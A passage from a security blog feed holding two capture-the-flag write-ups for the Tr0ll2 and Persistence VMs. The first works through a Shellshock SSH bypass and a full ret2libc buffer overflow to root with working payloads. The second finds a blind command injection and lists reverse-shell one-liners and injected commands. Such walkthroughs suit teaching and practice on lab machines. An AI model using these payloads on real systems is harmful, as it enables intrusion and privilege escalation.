Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-10-10 08:29:08
```</p>

<p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>

<p><code>bash
root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.56.101:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
</code></p>

<p>Yay! Progress! Lets take a closer look&hellip;</p>

<p>```bash
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pas
Passive mode on.</p>

<p>ftp> ls
227 Entering Passive Mode (192,168,56,101,73,4)
150 Here comes the directory listing.
-rw-r&mdash;r&mdash;    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.</p>

<p>ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
227 Entering Passive Mode (192,168,56,101,105,73)
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (621.0 kB/s)</p>

<p>ftp> bye
221 Goodbye.
```</p>

<h1>noob key</h1>

<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>

<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>

<p>```bash
root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
  inflating: noob</p>

<p>root@kali:~# cat noob
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>

<p><code>bash
root@kali:~/Desktop/troll2# chmod 600 noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
</code></p>

<h2>shocking isn&rsquo;t it</h2>

<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>

<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>

<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>

<p><code>bash
root@kali:~# ssh noob@192.168.56.101 -i noob -t '() { :;}; /bin/bash'
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></p>

<p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!"</code> before the public key.</p>

<h2>which door leads to r00t</h2>

<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>

<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>

<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>

<p>```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell&hellip;
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2</p>

<pre><code>(/dev/pts/0) at 0:48 ...
</code></pre>

<p>The system is going down for reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
```</p>

<p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>

<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>

<p><code>bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
[...]
0001214 __libc_start_main
0001236 GLIBC_2.0
0001320 R
0001453 Q
0001521 %
0001526 h
0001626 h
0001646 h(
0002066 t&amp;
0002073 '
0002305 i
0002620 Good job, stand by, executing root shell...
0002674 BUHAHAHA NOOB!
0002713 /sbin/reboot
0002733 ;0
0002750 L
0002760 p
0003025 zR
0003044  
0003060 p
0003077 x
[...]
</code></p>

<p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>

<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>

<h2>bof bof bof your boat&hellip;</h2>

<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>

<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>

<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>

<p><code>bash
root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
</code></p>

<p>No security? EZ PEZE.</p>

<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>

<p><code>bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" * 500')
Segmentation fault
</code></p>

<p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>

<p>```bash
noob@Tr0ll2:/tmp$ ldd ./r00t</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
/lib/ld-linux.so.2 (0x80000000)
</code></pre>

<p>noob@Tr0ll2:/tmp$ ldd ./r00t</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
/lib/ld-linux.so.2 (0x80000000)
</code></pre>

<p>```</p>

<p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>

<h2>the exploit</h2>

<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>

<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)
Starting program: /tmp/r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()</p>

<p>(gdb) x/x $eip
0x41414141: Cannot access memory at address 0x41414141
```</p>

<p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>

<p>Lets generate the pattern.</p>

<p>```bash
root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb</p>

<p>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```</p>

<p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) r &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&rdquo;</p>

<p>Starting program: /tmp/r00t &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&rdquo;</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
```</p>

<p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>

<p><code>bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
[*] Exact match at offset 268
</code></p>

<p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo; <em>268 + &ldquo;BBBB&rdquo;&rsquo;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t $(python -c &lsquo;print &ldquo;A&rdquo; </em>268 + &ldquo;BBBB&rdquo;&rsquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()</p>

<p>(gdb) x/x $eip
0x42424242: Cannot access memory at address 0x42424242
(gdb)
```</p>

<p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>

<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) b *main   # here we break on the main function
Breakpoint 1 at 0x8048444: file bof.c, line 3.</p>

<p>(gdb) r         # here we run the application&hellip;.
Starting program: /tmp/r00t</p>

<p>Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
3   bof.c: No such file or directory.</p>

<p>(gdb) p system  # and leak the locatin of system() in memory
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```</p>

<p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>

<p>So far our exploit payload will look something like this:</p>

<p><code>text
A * 268 + system() + JUNK
</code></p>

<p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>

<p>So lets create this string, which we will refer to as the EGG.</p>

<p><code>bash
noob@Tr0ll2:/tmp$ export EGG=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG=/bin/sh
</code></p>

<p>Next, we can use a small C program to tell us where this EGG is in memory:</p>

<p>```bash
noob@Tr0ll2:/tmp$ cat /tmp/findegg.c</p>

<h1>include &lt;unistd.h></h1>

<p>int main(void)
{
  printf(&ldquo;EGG address: 0x%lx\n&rdquo;, getenv(&ldquo;EGG&rdquo;)+4);
  return 0;
}</p>

<p>noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[&hellip;]</p>

<p>noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
```</p>

<p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>

<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>

<p><code>text
A * 268 + system() + JUNK + EGG
</code></p>

<p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>

<p><code>bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x04\xff\xff\xbf"')
Segmentation fault
</code></p>

<p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>

<p>```bash</p>

<h1>so just to recap, we check for the location of the EGG</h1>

<p>noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04</p>

<h1>EGG is at 0xbfffff04, so in little endian format we have:</h1>

<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x04\xff\xff\xbf&rdquo;&rsquo;)
Segmentation fault</p>

<h1>A segfault, lets move it up 1 byte</h1>

<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x05\xff\xff\xbf&rdquo;&rsquo;)
sh: 1: =/bin/sh: not found
Segmentation fault</p>

<h1>another segfault, however we have a little diagnostics message now</h1>

<h1>showing that we are not far off :)</h1>

<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x06\xff\xff\xbf&rdquo;&rsquo;)
$
```</p>

<h2>trollin the rootin</h2>

<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>

<p><code>bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x06\xff\xff\xbf"')
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
</code></p>

<p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>

<p>```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\xe2\xfe\xff\xbf&rdquo;&rsquo;)</p>

<h1>id</h1>

<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
```</p>

<p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>

<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>

<p>```bash</p>

<h1>cat /root/Proof.txt</h1>

<p>You win this time young Jedi&hellip;</p>

<p>a70354f0258dcc00292c72aab3c8b1e4
```</p>

<p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[From Persistence, to pain, to PWN]]></title>
    <link href="http://leonjza.github.io/blog/2014/09/18/from-persistence/"/>
    <updated>2014-09-18T06:58:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/09/18/from-persistence</id>
    <content type="html"><![CDATA[<h2>persist we must!</h2>

<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>

<p><blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote></p>

<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>

<!--more-->


<h2>lets get our hands dirty</h2>

<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>

<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>

<p>```bash First Persistence Nmap
root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 07:01 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0037s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
```</p>

<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>

<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>

<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>

<p>```bash PHP reveal
root@kali:~# curl -v 192.168.56.104/index.php
* About to connect() to 192.168.56.104 port 80 (#0)
*   Trying 192.168.56.104&hellip;
* connected
* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)</p>

<blockquote><p>GET /index.php HTTP/1.1
User-Agent: curl/7.26.0
Host: 192.168.56.104
Accept: <em>/</em></p></blockquote>

<ul>
<li>additional stuff not fine transfer.c:1037: 0 0</li>
<li>HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 404 Not Found
&lt; Server: nginx/1.4.7
&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
&lt; Content-Type: text/html
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; X-Powered-By: PHP/5.3.3</li>
</ul>


<p>No input file specified.</p>

<ul>
<li>Connection #0 to host 192.168.56.104 left intact</li>
<li>Closing connection #0
```</li>
</ul>


<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>

<h2>finding that (de)bugger</h2>

<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>

<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>

<p>```bash discovering debug.php
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt &mdash;hc 404 <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>00434:  C=200     12 L        28 W      357 Ch    &ldquo; &ndash; debug&rdquo;
```</p>

<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>

<p><img class="<a" src="href="https://i.imgur.com/neKe18e.png">https://i.imgur.com/neKe18e.png</a>"></p>

<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>

<h2>blind command injection</h2>

<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>

<p><code>bash ping test
root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
</code></p>

<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>

<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>

<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>

<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>

<h2>blind command injection &ndash; file enumeration</h2>

<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>

<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>

<p><code>bash File existence check payload
;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
</code></p>

<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>

<p>```bash File existence response
